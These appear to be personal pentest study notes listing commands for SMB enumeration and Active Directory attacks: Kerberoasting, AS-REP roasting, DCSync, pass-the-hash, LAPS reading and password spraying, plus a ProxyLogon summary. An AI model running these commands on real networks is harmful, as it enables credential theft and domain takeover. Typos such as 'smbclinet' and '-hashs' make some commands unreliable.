##### nmap
locate and run scripts -> `locate -r '\.nse$' | xargs grep categories | grep "<categorie1|categorie2>"`

##### smb
`smbclinet -L //<ip>`
	to download all accessed files: `recurse ON` , `prompt OFF`, `mget *`
`smbmap -H <ip>` 
	`-R <dir_share>` recursive directory listing  
	`-A <file_name>` download file using it's name, no need for path
`enum4linux <ip>`


##### AD enum
##### have user on box
**enumerate users**: `GetADUsers.py -all <domain.name>/<user> -dc-ip <domain_ip>`

###### run bloodhound
- get cmd on target using `psexec` or using `runas /netonly /user:dc\uname cmd`
- run `sharpHound.exe -c all -d <dc> --domainController <ip>` to collect info for bloodhound  **make sure u use correct DNS configured on windows machine**
- `neo4j start`  and `./bloodhound`
##### get shell
- `crackmapexec <protocol> <target(s)> -u username -p 'Admin!123@'`
		protocols: `smb` , `winrm`
	- then u can use `evil-winrm` or `psexec`
- **shell** in case of u have writable SMB dir: `psexec.py <domain.name>/<user>@<domain_ip>`
- pass the hash
	`psexec.py <domain>/<user>@<ip> -hashs <NTHash:NTHash>`
- use certificate or private key : `evil-winrm -c key.crt -k key.pem` 
	u make need to use `-S` if `wsmans` enabled

###### AD attacks
before we talk about attacks, whenever heard the word AD think about it as a forest, cuz if a domain on forest is compromised attackers can simply attack other domains without any ability to stop them
![[Pasted image 20241009174415.png]]
-------
- SPN users
	- Use the following queries in BloodHound:
		- “List all Kerberoastable Accounts”
		- “Find Kerberoastable Users with Most Privileges”
	- To obtain an account hash from the Ticket Granting Service (TGS), run:
	  `GetUserSPNs.py -request -dc-ip <DomainControllerIP> <domain\user>`
	- After retrieving the TGS ticket, crack the hash using **hashcat**. `13100`
	> Kerberoastable accounts are service accounts that run with user credentials, as opposed to machine/computer accounts. These user accounts often have weak passwords, making them prime targets for Kerberoasting.
	> In Kerberos authentication, step 5 ("tgs-req") involves the user requesting a TGS. The Domain Controller issues a TGS ticket encrypted with the service account's password hash. If this password is weak, the hash can be cracked to gain access to the service account.

	https://www.tarlogic.com/blog/how-to-attack-kerberos/#Kerberoasting
	https://tcm-sec.com/kerberoasting-domain-accounts/
----------
 - NP user (authenticated users without password)
	 get TGTs for those users that have the property 'Do not require Kerberos preauthentication'
	 - get TGT `GetNPUsers.py <domain/username>`
	 - decrypt TGT using john or hashcat
---------
- DCSync attack
	DC sync is add new domain controller to the domain in order to join the domain the DC sync ntds.dit and other important data
	tools: mimicaz or impact `secretsdump.py <domain/user@ip>` ![[Pasted image 20241007135348.png]]
----
- `LAPS Reader` group can access passwords 
	`Get-ADComputer -Filter 'ObjectClass -eq "computer"' -Property *`
	or use python script: [LAPSDumper](https://github.com/n00py/LAPSDumper)
	https://www.powershellgallery.com/packages/Get-ADComputers-LAPS-Password/2.0/Content/Get-ADComputers-LAPS-Password.ps1 
---
- password spray using [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
	- get users by [powerview](https://github.com/PowerShellMafia/PowerSploit/)
	```
	powershell.exe -nop -exec bypass
	Import-Module PowerView.ps1
	# get domain
	Get-Domain | select Name
	# get users
	Get-NetUser -Domain <domain-name> | select cn | out-file users.txt
	```
	- lunch the attack
	```
	Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt
	```
----
- ADCS expolit
	ADCS: Active Directory Certificate Services , witch used to issue certs that used for encrypt communication, authentication
	that certs have a `certificate Templates` witch define **how certificates are issued** and their **permissions**.
	- if configured wrong ->
		- used in NTLM Relay to ADCS
		- Domain impersonate
	

----
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet?tab=readme-ov-file


----
----
### vulns 
#### ProxyLogon
- **Technical Details**: A combination of vulnerabilities (CVE-2021-26855 and others) in Microsoft Exchange Server. Exploits included:
    - **Server-Side Request Forgery (SSRF)**: Allowed attackers to bypass authentication.
    - **Privilege Escalation**: Enabled attackers to impersonate users and execute arbitrary commands as SYSTEM.
- **Exploitation**: Attackers could use these vulnerabilities to drop web shells (malicious scripts) on servers for persistent access.
- affects: (Exchange 2013 Versions , Exchange 2016 CU18 , Exchange 2016 CU19, Exchange 2019)
- https://www.rapid7.com/db/modules/exploit/windows/http/exchange_proxylogon_rce/
----
